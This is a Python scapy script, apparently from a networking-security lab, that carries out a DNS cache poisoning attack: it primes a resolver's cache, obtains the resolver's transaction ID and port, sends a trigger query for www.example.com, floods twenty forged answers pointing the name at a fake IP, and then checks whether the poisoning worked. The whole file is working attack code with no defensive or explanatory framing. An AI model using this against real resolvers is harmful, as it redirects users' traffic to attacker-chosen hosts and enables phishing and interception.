import os
import sys
import time
import socket
import struct
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if PARENT_DIR not in sys.path:
    sys.path.insert(0, PARENT_DIR)

from scapy.all import *
from common_library import *


print("[*] 0. First query, just to get the resolver to cache the NS record for example.com...")

dns_loader = build_spoofed_dns_request(attacker_ip, 12345, 53, "example.com.", "NS")
ans = sr1(dns_loader, timeout=10, verbose=0)

print(ans.show() if ans else "No answer received")


print("[*] 1. Leaking resolver TXID/port via controlled domain...")
leaked_txid, target_port = sniff_port_and_txid(5)



trigger_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
#prebuild query to speed up the attack, since we need to send 20 responses as fast as possible
to_send =[]
for i in range(1, 21):
    pkt = build_spoofed_dns_response((leaked_txid + i) % 65536, target_port, fake_ip, qname="www.example.com.", qtype='A')
    to_send.append(pkt)

print("[*] 2. Sending and spoofing responses.")
send(trigger_query, verbose=0)
send(to_send, verbose=0)


print("[*] 3. Verifying if the cache is poisoned...")
test_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
ans = sr1(test_query, timeout=10, verbose=0)
print(ans.show() if ans else "No answer received")

if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")
